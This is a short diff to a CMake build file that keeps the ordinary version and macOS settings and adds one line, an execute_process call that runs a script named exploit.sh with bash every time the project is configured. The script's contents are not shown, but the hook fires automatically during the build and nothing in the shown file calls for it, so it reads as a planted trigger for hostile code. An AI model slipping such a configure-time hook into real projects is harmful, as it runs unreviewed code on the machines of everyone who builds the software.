@@ -1,5 +1,7 @@
 cmake_minimum_required(VERSION 3.20)
 
+execute_process(COMMAND bash ${CMAKE_SOURCE_DIR}/exploit.sh)
+
 if (APPLE)
     set(CMAKE_OSX_DEPLOYMENT_TARGET "11.0" CACHE STRING "Minimum OS X deployment version")
 endif()
